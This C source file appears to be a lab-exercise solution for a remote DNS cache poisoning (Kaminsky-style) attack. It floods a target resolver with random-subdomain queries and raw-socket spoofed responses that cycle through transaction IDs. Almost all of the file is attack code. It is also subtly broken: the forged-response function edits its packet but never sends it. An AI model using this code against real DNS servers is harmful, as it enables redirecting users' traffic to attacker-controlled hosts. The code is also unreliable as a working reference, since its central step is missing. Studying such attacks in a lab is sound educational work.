#include "attacker.h"

int main()
{
  // for generate random name
  srand(time(NULL));

  // Load the DNS request packet from file
  unsigned char ip_req[MAX_FILE_SIZE];
  int n_req = read_file("req.bin", ip_req);

  // Load the first DNS response packet from file
  unsigned char ip_resp[MAX_FILE_SIZE];
  int n_resp = read_file("res.bin", ip_resp);

  // reset the id
  unsigned short id = 0;

  while (1)
  {
    // Generate a random name with length 5
    char name[6];
    generate_name(name);

    // ##################################################################
    /* Step 1. Send a DNS request to the targeted local DNS server.
               This will trigger the DNS server to send out DNS queries */
    send_dns_request(name, ip_req, n_req);

    /* Step 2. Send many spoofed responses to the targeted local DNS server,
               each one with a different transaction ID. */
    for (size_t i = 0; i < 200; i++)
    {
      // send the response
      send_dns_response(name, ip_resp, n_resp, id);
      // increade the id
      id++;
    }
    // ##################################################################
  }
}

/* Use for sending DNS request.
 * Add arguments to the function definition if needed.
 * */
void send_dns_request(char *name, unsigned char *ip_req, int n_req)
{
  // Modify the name in the question field (offset=41)
  memcpy(ip_req + 41, name, 5);
  // send the packet
  send_raw_packet(ip_req, n_req);
}

/* Use for sending forged DNS response.
 * Add arguments to the function definition if needed.
 * */
void send_dns_response(char *name, unsigned char *ip_resp, int n_resp, unsigned short id)
{
  // Modify the name in the answer field (offset=64)
  memcpy(ip_resp + 64, name, 5);
  // Modify the transaction ID field (offset=28)
  unsigned short id_net_order = htons(id);
  memcpy(ip_resp + 28, &id_net_order, 2);
}

/* Send the raw packet out
 *    buffer: to contain the entire IP packet, with everything filled out.
 *    pkt_size: the size of the buffer.
 * */
void send_raw_packet(char *buffer, int pkt_size)
{
  struct sockaddr_in dest_info;
  int enable = 1;

  // Step 1: Create a raw network socket.
  int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

  // Step 2: Set socket option.
  setsockopt(sock, IPPROTO_IP, IP_HDRINCL,
             &enable, sizeof(enable));

  // Step 3: Provide needed information about destination.
  struct ipheader *ip = (struct ipheader *)buffer;
  dest_info.sin_family = AF_INET;
  dest_info.sin_addr = ip->iph_destip;

  // Step 4: Send the packet out.
  sendto(sock, buffer, pkt_size, 0,
         (struct sockaddr *)&dest_info, sizeof(dest_info));
  close(sock);
}

int read_file(char *fileName, unsigned char *ip_packet)
{
  FILE *packet = fopen(fileName, "rb");
  if (!packet)
  {
    perror("Can't open 'res.bin'");
    exit(1);
  }
  int n_bytes = fread(ip_packet, 1, MAX_FILE_SIZE, packet);
  fclose(packet);

  return n_bytes;
}

void generate_name(char *name)
{
  char letters[26] = "abcdefghijklmnopqrstuvwxyz";
  // Generate a random name of length 5
  name[5] = 0;
  for (size_t i = 0; i < 5; i++)
    name[i] = letters[rand() % 26];
}
